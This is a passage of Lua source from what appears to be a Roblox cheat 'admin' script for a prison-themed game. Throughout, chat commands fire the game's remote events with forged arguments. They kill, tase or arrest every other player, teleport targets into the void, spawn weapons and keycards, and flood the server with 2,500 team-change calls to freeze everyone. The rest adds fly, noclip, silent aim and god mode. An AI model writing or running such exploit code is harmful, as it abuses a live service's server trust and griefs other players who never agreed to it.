	local mod = require(game.ReplicatedStorage["Modules_client"]["RegionModule_client"])
	local a = pcall(function()
		if mod.findRegion(player.Character) then
			mod = mod.findRegion(player.Character)["Name"]
		end
	end)
	if not a then
		return
	end
	for i, v in pairs(game:GetService("ReplicatedStorage").PermittedRegions:GetChildren()) do
		if v and mod == v.Value then
			return false
		end
	end
	return true
end
function AntiPunchC(v2)
	if States.antipunch == false then
		return
	end
	pcall(function()
		if v2 == plr then
			return
		end
		v2.Character:FindFirstChildOfClass("Humanoid").AnimationPlayed:Connect(function(animationTrack)
			pcall(function()
				if not Unloaded and States.antipunch then
					if animationTrack.Animation.AnimationId == "rbxassetid://484200742" or animationTrack.Animation.AnimationId =="rbxassetid://484926359" then
						if (plr.Character.HumanoidRootPart.Position-v2.Character.HumanoidRootPart.Position).magnitude <3.5 and States.antipunch and not table.find(API.Whitelisted,v2) then
							for i =1,15 do
								task.spawn(function()
									game.ReplicatedStorage["meleeEvent"]:FireServer(v2)
								end)
							end
						end
			                end
				end
			end)
		end)
	end)
end
local Flying = false
function API:Fly(speed)
	Flying = true
	local Controler = require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild('PlayerModule'):WaitForChild("ControlModule"))
	local BodyA,BodyB = Instance.new("BodyVelocity"),Instance.new("BodyGyro")
	BodyA.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
	BodyA.MaxForce = Vector3.new(0,0,0)
	BodyA.Velocity = Vector3.new(0,0,0)
	BodyB.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
	BodyB.MaxTorque = Vector3.new(4^234,4^234,4^234)
	BodyB.P = 10000
	BodyB.D = 50
	API.FlyA = BodyA
	API.FlyB = BodyB
	local camera = game.Workspace.CurrentCamera
	API.FlyConnection = game:GetService"RunService".RenderStepped:Connect(function()
		if game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health >0 and BodyA and BodyB then
			local direction = Controler:GetMoveVector()
			BodyA.MaxForce = Vector3.new(4^234,4^234,4^234)
			BodyB.MaxTorque = Vector3.new(4^234,4^234,4^234)
			BodyB.CFrame = camera.CoordinateFrame
			BodyA.Velocity = Vector3.new()
			if direction.X > 0 then
				BodyA.Velocity = BodyA.Velocity + camera.CFrame.RightVector*(direction.X*(speed*10))
			end
			if direction.X < 0 then
				BodyA.Velocity = BodyA.Velocity + camera.CFrame.RightVector*(direction.X*(speed*10))
			end
			if direction.Z > 0 then
				BodyA.Velocity = BodyA.Velocity - camera.CFrame.LookVector*(direction.Z*(speed*10))
			end
			if direction.Z < 0 then
				BodyA.Velocity = BodyA.Velocity - camera.CFrame.LookVector*(direction.Z*(speed*10))
			end
		end
	end)
end
function API:Unfly()
	if Flying then
		Flying = false
		API:Destroy(API.FlyA)
		API:Destroy(API.FlyB)
		API.FlyConnection:Disconnect()
		API:Refresh(true)
	end
end
function PlayerChatted(Message)
  if Unloaded then return end
  local args = Message:split(" ")
  function Command(Cmd)
    return args[1] == Prefix..Cmd
  end
  function NotCommand(Cmd)
    return args[1] ~= Prefix..Cmd
  end
  if Command("unload") then
    API:Destroy(ScreenGui)
    API:Destroy(game:FindFirstChild("Septex_Admin"))
    API.ViewingPlayer = nil
    workspace.CurrentCamera.CameraSubject = plr.Character
    Unloaded = true
    Cooldown = true
    API:Notif("Unload", 'Script is unloaded', Color3.fromRGB(55, 155, 255), 5)
  end
  if Command("prefix") then
    local New = args[2]
    if New and tostring(New) then
      local NewPrefix = tostring(New)
      Prefix = NewPrefix
      TextBox.PlaceholderText = "Press "..Prefix.." To Enter"
      API:Notif("OK", 'prefix set to '..Prefix, Color3.fromRGB(0, 255, 0), 3)
    end
  end
  if Command("re") or Command("refresh") then
    API:Refresh()
    API:Notif("OK", "Respawn Character and save position", Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("cmds") or Command("cmd") then
    if Frame_2.Visible then
	Frame_2.Visible = false
    else
	Frame_2.Visible = true
    end
  end
  if Command("inmate") or Command("in") then
    API:ChangeTeam(game.Teams.Inmates)
    API:Notif("OK", 'Change Team Inmates', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("guard") or Command("gu") then
    if not API:GuardsFull("c") then
      API:ChangeTeam(game.Teams.Guards)
      API:Notif("OK", 'Change Team Guards', Color3.fromRGB(0, 255, 0), 3)
    else
      API:Notif("Error", 'Guards Full!', Color3.fromRGB(255, 0, 0), 3)
    end
  end
  if Command("autore") or Command("autorespawn") then
    ChangeState(args[2],"AutoRespawn")
  end
  if Command("autoremoveff") or Command("autorff") then
    ChangeState(args[2],"AutoRemoveff")
  end
  if Command("killaura") then
    local value = ChangeState(args[2],"KillAura")
    if value then
      while wait() do
        if States.KillAura then
          for i,v in pairs(game.Players:GetPlayers()) do
            if v ~= plr and not table.find(API.Whitelisted,v) then
              if v.Character.Humanoid.Health > 0 or not v.Character:FindFirstChild("ForceField") then
                game.ReplicatedStorage.meleeEvent:FireServer(v)
              end
            end
          end
        end
      end
    end
  end
  if Command("whitelist") or Command("wl") then
    local Player = API:FindPlayer(args[2])
    if not table.find(API.Whitelisted, Player.Name) then
      table.insert(API.Whitelisted, Player.Name)
      API:Notif("OK", 'Whitelisted '..Player.DisplayName, Color3.fromRGB(0, 255, 0), 3)
    else
      API:Notif("Error", 'Player is already whitelist!', Color3.fromRGB(255, 0, 0), 3)
    end
  end
  if Command("unwhitelist") or Command("unwl") then
    local Player = API:FindPlayer(args[2])
    if table.find(API.Whitelisted, Player.Name) then
      table.remove(API.Whitelisted,table.find(API.Whitelisted, Player.Name))
      API:Notif("OK", 'Blacklisted '..Player.DisplayName, Color.fromRGB(0, 255, 0), 3)
    else
      API:Notif("Error", 'Player is not already whitelist!', Color3.fromRGB(255, 0, 0), 3)
    end
  end
  if Command("kill") or Command("oof") or Command("die") then
    local Team = IsTeamCommandCheck(args[2])
    if args[2] == "all" or args[2] == 'others' or args[2] == "everyone" then
	API:killall(game.Teams.Neutral,10)
	API:Notif("OK", 'Killed '..args[2], Color3.fromRGB(0, 255, 0), 3)
    elseif Team == game.Teams.Inmates then
	API:killall(game.Teams.Inmates,10)
	API:Notif("OK", 'Killed inmates', Color3.fromRGB(0, 255, 0), 3)
    elseif Team == game.Teams.Guards then
	API:killall(game.Teams.Guards,10)
	API:Notif("OK", 'Killed guards', Color3.fromRGB(0, 255, 0), 3)
    elseif Team == game.Teams.Criminals then
	API:killall(game.Teams.Criminals,10)
	API:Notif("OK", 'Killed criminals', Color3.fromRGB(0, 255, 0), 3)
    else
	local Target = API:FindPlayer(args[2])
	if Target then
		API:KillPlayer(Target,10)
		API:Notif("OK", 'Killed '..Target.DisplayName, Color3.fromRGB(0, 255, 0), 3)
	end
    end
  end
  if Command("olditemmethod") or Command("oldimethod") then
    ChangeState(args[2],"OldItemMethod")
  end
  if Command("damage") or Command("dmg") then
	local Team = IsTeamCommandCheck(args[2])
	local bullet = tonumber(args[3])
    if args[2] == "all" or args[2] == 'others' or args[2] == "everyone" then
	if bullet ~= nil then
		API:killall(game.Teams.Neutral,bullet)
		API:Notif("OK", 'Damages '..args[2]..' '..bullet, Color3.fromRGB(0, 255, 0), 3)
	else
		API:Notif("Error", 'No Damage Found', Color3.fromRGB(255, 0, 0), 3)
	end
    elseif Team == game.Teams.Inmates then
	if bullet ~= nil then
		API:killall(game.Teams.Inmates,bullet)
		API:Notif("OK", 'Damages inmates '..bullet, Color3.fromRGB(0, 255, 0), 3)
	else
		API:Notif("Error", 'No Damage Found', Color3.fromRGB(255, 0, 0), 3)
	end
    elseif Team == game.Teams.Guards then
	if bullet ~= nil then
		API:killall(game.Teams.Guards,bullet)
		API:Notif("OK", 'Damages guards '..bullet, Color3.fromRGB(0, 255, 0), 3)
	else
		API:Notif("Error", 'No Damage Found', Color3.fromRGB(255, 0, 0), 3)
	end
    elseif Team == game.Teams.Criminals then
	if bullet ~= nil then
		API:killall(game.Teams.Criminals,bullet)
		API:Notif("OK", 'Damages criminals '..bullet, Color3.fromRGB(0, 255, 0), 3)
	else
		API:Notif("Error", 'No Damage Found', Color3.fromRGB(255, 0, 0), 3)
	end
    else
	local Target = API:FindPlayer(args[2])
	if Target then
		if bullet ~= nil then
			API:KillPlayer(Target,bullet)
			API:Notif("OK", 'Damages '..Target.DisplayName..' '..bullet, Color3.fromRGB(0, 255, 0), 3)
		else
			API:Notif("Error", 'No Damage Found', Color3.fromRGB(255, 0, 0), 3)
		end
	end
    end
  end
  if Command("autodumpcars") or Command('autoremovecars') or Command("autonocars") then
    ChangeState(args[2],"AutoDumpCars")
  end
  if Command("criminal") or Command("crim") or Command("makecrim") then
	if args[2] then
		local Target = API:FindPlayer(args[2])
		if Target then
			if Target.Team ~= game.Teams.Criminals then
				API:bring(Target, saved)
				API:Notif("OK", 'Made '..Target.DisplayName..' criminal.', Color3.fromRGB(0, 255, 0), 3)
			else
				API:Notif("Error", Target.DisplayName..' is criminal.', Color3.fromRGB(255, 0, 0), 3)
			end
		end
	else
		if Player.Team ~= game.Teams.Criminals then
			API:ChangeTeam(game.Teams.Criminals)
			API:Notif("OK", 'Made '..plr.DisplayName..' criminal.', Color3.fromRGB(0, 255, 0), 3)
		else
			API:Notif("Error", Player.DisplayName..' is criminal.', Color3.fromRGB(255, 0, 0), 3)
		end
	end
  end
  if Command("antisit") then
	ChangeState(args[2],"AntiSit")
  end
  if Command("infjump") then
	ChangeState(args[2],"InfJump")
  end
  if Command("bring") then
	local Target = API:FindPlayer(args[2])
	if Target then
		API:bring(Target)
		API:Notif("OK", 'Brought '..Target.DisplayName..' To You', Color3.fromRGB(0, 255, 0), 3)
	end
  end
  if Command("void") then
	local Target = API:FindPlayer(args[2])
	if Target then
		API:bring(Target, CFrame.new(7^7, 7^7, 7^7))
		API:Notif("OK", 'Brought '..Target.DisplayName..' To Void', Color3.fromRGB(0, 255, 0), 3)
	end
  end
  if Command("view") then
	local Player = API:FindPlayer(args[2])
	if Player then
		if API.ViewingPlayer  then
			API.ViewingPlayer = nil
			wait(.2)
		end
		API.ViewingPlayer = Player
		API:Notif("OK", 'Viewing '..Player.DisplayName, Color3.fromRGB(0, 255, 0), 3)
		task.spawn(function()
			while wait() do
				pcall(function()
					workspace.CurrentCamera.CameraSubject = Player.Character:FindFirstChildOfClass("Humanoid")
				end)
				if not Player or not API.ViewingPlayer or Unloaded then
					workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
					break
				end
			end
		end)
	end
  end
  if Command("unview") then
	API.ViewingPlayer = nil
	wait()
	workspace.CurrentCamera.CameraSubject = plr.Character
	API:Notif("OK", 'Stopped viewing player', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("copychat") then
	ChangeState(args[2],"CopyChat")
  end
  if Command("antifling") then
	ChangeState(args[2],"AntiFling")
  end
  if Command("goto") or Command("to") then
	local PLR = API:FindPlayer(args[2])
	local Position = API:GetPosition(PLR)
	if PLR and Position then
		API:MoveTo(Position)
	end
  end
  if Command("shotgun") or Command("remington") or Command('rem') then
	API:GetGun("Remington 870")
	API:Notif("OK", 'Obtain remington 870', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("ak-47") or Command('ak') then
	API:GetGun("AK-47")
	API:Notif("OK", 'Obtain ak-47', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("m9") or Command("pistol") then
	API:GetGun("M9")
	API:Notif("OK", 'Obtain m9', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("m4a1") or Command("m4") then
	if not bgp then
		API:Notif("Error", 'Not Gamepass!', Color3.fromRGB(255, 0, 0), 3)
	else
		API:GetGun("M4A1")
		API:Notif("OK", 'Obtain m4a1', Color3.fromRGB(0, 255, 0), 3)
	end
  end
  if Command("hammer") or Command("ham") then
	API:GetSingle("Hammer")
	API:Notif("OK", 'Obtain hammer', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("knife") or Command("knive") then
	API:GetGun("Crude Knife")
	API:Notif("OK", 'Obtain crude knife', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("guns") then
	API:AllGuns()
	API:Notif("OK", 'Obtain all guns', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("items") then
	API:AllItems()
	API:Notif("OK", 'Obtain all items', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("autoguns") or Command("aguns") then
	ChangeState(args[2],"AutoGuns")
  end
  if Command("autoitems") or Command("aitems") then
	ChangeState(args[2],'AutoItems')
  end
  if Command("loopcrim") then
	if args[2] and args[2] ~= plr then
		local Player = API:FindPlayer(args[2])
		if not table.find(API.LoopCrim, Player.Name) then
			table.insert(API.LoopCrim, Player.Name)
			API:Notif("OK", 'Auto make '..Player.DisplayName..' criminal.', Color3.fromRGB(0, 255, 0), 3)
		else
			API:Notif("OK", 'Player is already auto criminal.', Color3.fromRGB(255, 0, 0), 3)
		end
	else
		States.LoopCrim = true
		API:Notif("OK", 'Auto make '..Player.DisplayName..' criminal.', Color3.fromRGB(0, 255, 0), 3)
		plr.CharacterAdded:Connect(function()
			if States.LoopCrim and Unloaded == false then
				if plr.Team == game.Teams.Inmates then
					repeat task.wait()
						plr.Character.Head.CanCollide = false
						workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
					until plr.Team == game.Teams.Criminals
					workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
				elseif plr.Team == game.Teams.Guards then
					pcall(function()
					repeat task.wait() until game:GetService("Players").LocalPlayer.Character
						game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")
					
						API:WaitForRespawn(Pos or API:GetPosition(),NoForce)
					end)
					repeat task.wait()
						plr.Character.Head.CanCollide = false
						workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
					until plr.Team == game.Teams.Criminals
					workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
				end
			end
		end)
	end
  end
  if Command("unloopcrim") then
	if args[2] and args[2] ~= plr then
		local Player = API:FindPlayer(args[2])
		if table.find(API.LoopCrim, Player.Name) then
			table.remove(API.LoopCrim,table.find(API.LoopCrim, Player.Name))
			API:Notif("OK", 'Stopped auto make '..Player.DisplayName..' criminal.', Color3.fromRGB(0, 255, 0), 3)
		else
			API:Notif("OK", 'Player is not already auto criminal.', Color3.fromRGB(255, 0, 0), 3)
		end
	else
		States.LoopCrim = false
		API:Notif("OK", 'Stopped auto make '..Player.DisplayName..' criminal.', Color3.fromRGB(0, 255, 0), 3)
	end
  end
  if Command("respawn") then
	if Player.Team == game.Teams.Guards then
			if API:GuardsFull("b") then
				workspace.Remote.TeamEvent:FireServer("Bright orange")
				plr.CharacterAdded:Wait()
				repeat task.wait()
					workspace.Remote.TeamEvent:FireServer("Bright blue")
				until plr.Team == game.Teams.Guards
			else
				workspace.Remote.TeamEvent:FireServer("Bright blue")
			end
		elseif Player.Team == game.Teams.Inmates then
			workspace.Remote.TeamEvent:FireServer("Bright orange")
		elseif Player.Team == game.Teams.Criminals then
			if not API:GuardsFull("c") then
				workspace.Remote.TeamEvent:FireServer("Bright blue")
				plr.CharacterAdded:Wait()
				repeat task.wait()
					plr.Character.Head.CanCollide = false
					workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
				until plr.Team == game.Teams.Criminals
				workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
			else
				workspace.Remote.TeamEvent:FireServer("Bright orange")
				plr.CharacterAdded:Wait()
				repeat task.wait()
					plr.Character.Head.CanCollide = false
					workspace["Criminals Spawn"].SpawnLocation.CFrame = plr.Character.Head.CFrame
				until plr.Team == game.Teams.Criminals
				workspace["Criminals Spawn"].SpawnLocation.CFrame = saved
			end
		end
  end
  if Command("opengate") then
	local OldPos = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
	repeat API:swait()
		API:MoveTo(game.Workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"].CFrame)
                pcall(function()
			for i = 1, 5 do
				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"])
			end
                end)
	until workspace.Prison_ITEMS.buttons["Prison Gate"]["Prison Gate"]
	wait()
	API:MoveTo(OldPos)
	API:Notif("OK", 'Opened the gate', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("car") then
	pcall(function()
			local OldPos = game:GetService("Players").LocalPlayer.Character:GetPrimaryPartCFrame()
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(-910, 95, 2157))
			wait()
			local car = nil
			task.spawn(function()
				car = game:GetService("Workspace").CarContainer.ChildAdded:Wait()
			end)
			repeat wait(.1)
				local ohInstance1 = game:GetService("Workspace").Prison_ITEMS.buttons:GetChildren()[8]["Car Spawner"]
				workspace.Remote.ItemHandler:InvokeServer(ohInstance1)
			until car
			repeat task.wait() until car:FindFirstChild("RWD") and car:FindFirstChild("Body") and car:FindFirstChild("Body"):FindFirstChild("VehicleSeat")
			car.PrimaryPart = car.RWD
			game:GetService("Players").LocalPlayer.Character:SetPrimaryPartCFrame(OldPos)
			wait(.1)
			local Done = false
			car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
			repeat 

				game:GetService("RunService").RenderStepped:Wait()
				car:SetPrimaryPartCFrame(OldPos)
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame =CFrame.new(car.Body.VehicleSeat.Position)
				car.Body.VehicleSeat:Sit(game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
				if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit == true then
					Done = true
				end
			until Done
		end)
  end
  if Command("forcefield") or Command("ff") then
	ChangeState(args[2],"ff")
  end
  if Command("speed") or Command("ws") then
	local number = tonumber(args[2])
	if number ~= nil then
		plr.Character.Humanoid.WalkSpeed = number
		API:Notif("OK", 'Changed speed to '..number, Color3.fromRGB(0, 255, 0), 3)
	else
		API:Notif("Error", 'Not Speed', Color3.fromRGB(255, 0, 0), 3)
	end
  end
  if Command("tp") then
	local player1 = API:FindPlayer(args[2])
	local player2 = API:FindPlayer(args[3])
	if player1 and player2 then
		API:bring(player1, player2.Character.HumanoidRootPart.CFrame)
		API:Notif("OK", 'Teleports '..player1.DisplayName..' to '..player2.DisplayName, Color3.fromRGB(0, 255, 0), 3)
	end
  end
  if Command('givekey') or Command("keycard") or Command("key") then
	local OldT = Player.Team
	if plr.Character:FindFirstChild("Key card") or plr.Backpack:FindFirstChild("Key card") then
		return API:Notif("Error", "You already have a keycard!", Color3.fromRGB(255, 0, 0), 3)
	elseif API:GuardsFull("c") then
		API:Notif("Error", 'Guards team is full!', Color3.fromRGB(255, 0, 0), 3)
		return
	elseif workspace.Prison_ITEMS.single:FindFirstChild("Key card") then
		repeat task.wait()
			local a =pcall(function()
				local Key = workspace.Prison_ITEMS.single["Key card"]
				game.Workspace.Remote["ItemHandler"]:InvokeServer({
					Position = Player.Character.Head.Position,
					Parent = Key
				})
			end)
		until plr.Backpack:FindFirstChild("Key card")
		API:Notif("OK", 'Obtain keycard', Color3.fromRGB(0, 255, 0), 3)
	elseif not game.Players.LocalPlayer.Backpack:FindFirstChild("Key card") or not workspace.Prison_ITEMS.single:FindFirstChild("Key card") or not API:GuardsFull("c") then
		API:ChangeTeam(game.Teams.Guards)
		repeat wait(.3)
			Player.Character:FindFirstChildOfClass("Humanoid"):ChangeState(15)
			if States.AutoRespawn then
				States.AutoRespawn = false
			end
			wait(.1)
			API:Refresh()
		until game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card")
		if game:GetService("Workspace")["Prison_ITEMS"].single:FindFirstChild("Key card") then
			if Player.Team ~= OldT then
				API:ChangeTeam(OldT)
				repeat task.wait() until Player.Team == OldT
			end
			wait()
			repeat task.wait()
				local a =pcall(function()
					local Key = workspace.Prison_ITEMS.single["Key card"]
					game.Workspace.Remote["ItemHandler"]:InvokeServer({
						Position = Player.Character.Head.Position,
						Parent = Key
					})
				end)
			until plr.Backpack:FindFirstChild("Key card")
			if not States.AutoRespawn then
				States.AutoRespawn = true
			end
			API:Notif("OK", 'Obtain keycard', Color3.fromRGB(0, 255, 0), 3)
		end
	end
  end
  if Command('antitase') then
	ChangeState(args[2],"AntiTase")
  end
  if Command("antishield") then
	ChangeState(args[2],"AntiShield")
  end
  if Command("autoguard") or Command("aguard") then
	if not API:GuardsFull("c") then
		ChangeState(args[2],"AutoGuard")
		if Player.Team ~= game.Teams.Guards then
			API:ChangeTeam(game.Teams.Guards)
		end
	else
		API:Notif("Error", 'Guards Full!', Color3.fromRGB(255, 0, 0), 3)
	end
  end
  if Command("silentaim") or Command("saim") then
	ChangeState(args[2],"SilentAim")
  end
  if Command('noclip') then
	ChangeState(args[2],"noclip")
  end
  if Command("shootback") or Command("antishoot") then
	ChangeState(args[2],"ShootBack")
  end
  if Command("doors") then
	local value = ChangeState(args[2],"DoorsDestroy")
	if value then
		workspace.Doors.Parent = game.Lighting
	else
		game.Lighting.Doors.Parent = workspace
	end
  end
  if Command("oneshot") then
	ChangeState(args[2],"OneShot")
  end
  if Command("anticrash") then
	local value = ChangeState(args[2],"anticrash")
	if value then
		pcall(function()
			game:GetService("Players").LocalPlayer.PlayerScripts.ClientGunReplicator.Disabled = true
		end)
	else
		pcall(function()
			game:GetService("Players").LocalPlayer.PlayerScripts.ClientGunReplicator.Disabled = true
		end)
	end
  end
  if Command("lagspike") then
	local a = game:GetService("RunService").Stepped:Connect(function()
		pcall(function()
			plr.Character:Destroy()
		end)
	end)
	local a2 = plr.CharacterAdded:Connect(function(a)
		pcall(function()
			a:Destroy()
		end)
		pcall(function()
			plr.Character:Destroy()
		end)
	end)
	for i =1,2500 do
		task.spawn(function()
			workspace.Remote.TeamEvent:FireServer("Bright orange")
		end)
	end
	wait(1)
	a:Disconnect()
	a2:Disconnect()
	wait(.5)
	task.spawn(function()
		workspace.Remote.TeamEvent:FireServer("Bright orange")
	end)
	wait(.1)
	API:Notif("OK", 'Freezes everyone', Color3.fromRGB(0, 255, 0), 3)
  end
  if Command("pp") then
	API:AllGuns()
	for i,v in pairs(Player.Character:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = Player.Backpack
		end
	end
	Player.Backpack.M9.Parent = Player.Character
	Player.Backpack["AK-47"].Parent = Player.Character
	Player.Backpack["Remington 870"].Parent = Player.Character
	wait()
	Player.Character.M9.GripPos = Vector3.new(0.9, 2, 0)
	Player.Character["Remington 870"].GripPos = Vector3.new(0.9, 2, 2.1)
	Player.Character["AK-47"].GripPos = Vector3.new(0.9, 2, 6.4)
	wait()
	for i,v in pairs(Player.Character:GetChildren()) do
		if v:IsA("Tool") then
			v.Parent = Player.Backpack
		end
	end
	wait()
	Player.Backpack.M9.Parent = Player.Character
	Player.Backpack["AK-47"].Parent = Player.Character
	Player.Backpack["Remington 870"].Parent = Player.Character
  end
  if Command("tase") then
	local Team = IsTeamCommandCheck(args[2])
	if args[2] == "all" or args[2] == "everyone" or args[2] == "others" then
		local Oldt = Player.Team
		if Oldt ~= game.Teams.Guards then
			API:ChangeTeam(game.Teams.Guards)
		end
		repeat wait() until Player.Backpack:FindFirstChild("Taser")
		local ohTable1 = {}
		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if v and v~= Player and not table.find(API.Whitelisted,v) and v.Team ~= game.Teams.Guards then
				table.insert(ohTable1, {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
					["Cframe"] = CFrame.new(),
					["Hit"] = v.Character.Head
				})
			end
		end
		local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
		game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
		task.spawn(function()
			game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
		end)
		API:ChangeTeam(Oldt)
		API:Notif("OK", 'Tased '..args[2], Color3.fromRGB(0, 255, 0), 3)
	elseif Team == game.Teams.Inmates then
		local Oldt = Player.Team
		if Oldt ~= game.Teams.Guards then
			API:ChangeTeam(game.Teams.Guards)
		end
		repeat wait() until Player.Backpack:FindFirstChild("Taser")
		local ohTable1 = {}
		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if v and v~= Player and not table.find(API.Whitelisted,v) and v.Team == game.Teams.Inmates then
				table.insert(ohTable1, {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
					["Cframe"] = CFrame.new(),
					["Hit"] = v.Character.Head
				})
			end
		end
		local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
		game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
		task.spawn(function()
			game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
		end)
		API:ChangeTeam(Oldt)
		API:Notif("OK", 'Tased inmates', Color3.fromRGB(0, 255, 0), 3)
	elseif Team == game.Teams.Crimimals then
		local Oldt = Player.Team
		if Oldt ~= game.Teams.Guards then
			API:ChangeTeam(game.Teams.Guards)
		end
		repeat wait() until Player.Backpack:FindFirstChild("Taser")
		local ohTable1 = {}
		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if v and v~= Player and not table.find(API.Whitelisted,v) and v.Team == game.Teams.Criminals then
				table.insert(ohTable1, {
					["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
					["Cframe"] = CFrame.new(),
					["Hit"] = v.Character.Head
				})
			end
		end
		local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
		game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
		task.spawn(function()
			game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
		end)
		API:ChangeTeam(Oldt)
		API:Notif("OK", 'Tased criminals', Color3.fromRGB(0, 255, 0), 3)
	else
		local Oldt = Player.Team
		local Target = API:FindPlayer(args[2])
		if Oldt ~= game.Teams.Guards then
			API:ChangeTeam(game.Teams.Guards)
		end
		repeat wait() until Player.Backpack:FindFirstChild("Taser")
		local ohTable1 = API:CreateBulletTable(1, Target.Character.Head)
		local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
		game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
		task.spawn(function()
			game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
		end)
		API:ChangeTeam(Oldt)
		API:Notif("OK", 'Tased '..Target.DisplayName, Color3.fromRGB(0, 255, 0), 3)
	end
  end
  if Command("arrest") or Command("ar") then
	if args[2] == "all" then
		local LastPosition = API:GetPosition()
		for i,v in pairs(game:GetService("Players"):GetPlayers()) do
			if v and v ~= game:GetService("Players").LocalPlayer and not table.find(API.Whitelisted,v) and v.Team == game.Teams.Criminals or (API:BadArea(v) and v.Team == game.Teams.Inmates) and v.Character.PrimaryPart and v.Character:FindFirstChildOfClass("Humanoid").Health>0 then
				repeat task.wait()
					API:UnSit()
					plr.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
					task.spawn(function()
						workspace.Remote.arrest:InvokeServer(v.Character.PrimaryPart)
					end)
				until v.Character["Head"]:FindFirstChildOfClass("BillboardGui")
				API:MoveTo(LastPosition)
			end
		end
		API:MoveTo(LastPosition)
		API:Notif("OK", 'Arrested all', Color3.fromRGB(0, 255, 0), 3)
	elseif args ~= "all" then
		local LastPosition = API:GetPosition()
		local Target = API:FindPlayer(args[2])
		if Target then
			if Target.Team == game.Teams.Guards or not API:BadArea(Target) then
				return API:Notif("Error", 'Cant arrest this player!', Color3.fromRGB(255, 0, 0), 3)
			else
				repeat task.wait()
					API:UnSit()
					plr.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-1)
						task.spawn(function()
							workspace.Remote.arrest:InvokeServer(Target.Character.PrimaryPart)
						end)
				until Target.Character["Head"]:FindFirstChildOfClass("BillboardGui")
				API:Notif("OK", 'Arrested '..Target.DisplayName, Color3.fromRGB(0, 255, 0), 3)
			end
		end
		API:MoveTo(LastPosition)
	end
  end
  if Command('clickkill') then
	ChangeState(args[2],'ClickKill')
  end
  if Command("clickarrest") then
	ChangeState(args[2],"ClickArrest")
  end
  if Command("god") or Command("godmode") then
	ChangeState(args[2],"Godmode")
  end
  if Command("arrestaura") then
	ChangeState(args[2],"ArrestAura")
  end
  if Command("antitouch") then
	ChangeState(args[2],"AntiTouch")
  end
  if Command("notify") then
	ChangeState(args[2],"Notify")
  end
  if Command("antipunch") then
	ChangeState(args[2],"antipunch")
  end
  if Command("spawnguns") then
	ChangeState(args[2],"spawnguns")
  end
  if Command('fly') then
	if Flying then
		API:Unfly()
	end
	wait(.2)
	API:Fly(tonumber(args[2]) or 7)
  end
  if Command('unfly') then
	if Flying then
		API:Unfly()
	end
  end
  if Command("carfly") then
	if Flying then
		API:Unfly()
	end
	wait()
	API:Fly(10)
  end
  if Command("uncarfly") then
	if Flying then
		API:Unfly()
	end
  end
